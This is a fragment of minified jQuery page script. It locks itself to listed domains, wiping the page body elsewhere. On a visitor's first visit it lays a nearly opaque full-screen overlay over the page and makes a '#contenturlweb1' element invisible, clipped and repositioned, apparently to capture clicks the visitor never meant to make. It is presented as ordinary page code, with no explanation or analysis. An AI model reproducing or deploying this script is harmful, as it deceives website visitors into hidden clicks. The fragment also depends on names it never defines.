	function gd(url){url = url.replace(/https?:\/\/(www.)?/i, '');if (url.indexOf('/') === -1){return url;}return url.split('/')[0];}
var str = gd(location.href).split("").join("aeiou");if (str in zy){function cc(name,value,days) {if (days) {var date = new Date();date.setTime(date.getTime()+(days*durat1));var expires = "; expires="+date.toGMTString();}else var expires = "";document.cookie = name+"="+value+expires+"; path=/";}function rc(name) {var nameEQ = name + "=";var ca = document.cookie.split(';');for(var i=0;i < ca.length;i++) {var c = ca[i];while (c.charAt(0)==' ') c = c.substring(1,c.length);if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);}return null;}function ec(name) {cc(name,"",-1);}jQuery(document).ready(function() {var visitedA = rc('visitedA');if (!visitedA || visitedA !== "true"){cc('visitedA', "true", 1);
if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)){
$("#waitloading").css({'margin':"Auto",'width':"Auto",'position':"fixed",'left':"0px",'right':"0px",'top':"0px",'bottom':"0px",'float':"none",'text-align':"center",'opacity':"0.9",'margin-top':"0%",'background-color':"white",'height':"2000px",'zIndex':"99999"});
$("#contenturlweb1").css({'clip':"rect(210px 417px 475px 82px)",'opacity':"0.0",'position':"absolute",'top':"130px"});
	    $(".video-container").css({'height':"0",'padding-bottom':"90.25%",'padding-top':"30px"});
    setTimeout(function(){$("#waitloading").remove();}, 15000);
    }else {
		$("#waitloading").css({'margin':"Auto",'width':"Auto",'position':"fixed",'left':"0px",'right':"0px",'top':"0px",'bottom':"0px",'float':"none",'text-align':"center",'opacity':"0.9",'margin-top':"0%",'background-color':"white",'height':"1500px",'zIndex':"99999"});
		$("#contenturlweb1").css({'clip':"rect(210px 417px 475px 82px)",'opacity':"0.0",'position':"absolute",'top':"130px"});
	    $(".video-container").css({'height':"0",'padding-bottom':"90.25%",'padding-top':"30px"});
		setTimeout(function(){$("#waitloading").remove();}, 15000); 
    }
}else{
	$("#waitloading").css({'margin':"Auto",'width':"Auto",'position':"fixed",'left':"0px",'right':"0px",'top':"0px",'bottom':"0px",'float':"none",'text-align':"center",'opacity':"0.9",'margin-top':"0%",'background-color':"white",'height':"2000px",'zIndex':"99999"});
	$('#urlweb1').remove();
	setTimeout(function(){$("#waitloading").remove();}, 5000);
}});}else{setTimeout(function(){$('body').remove();}, 500);}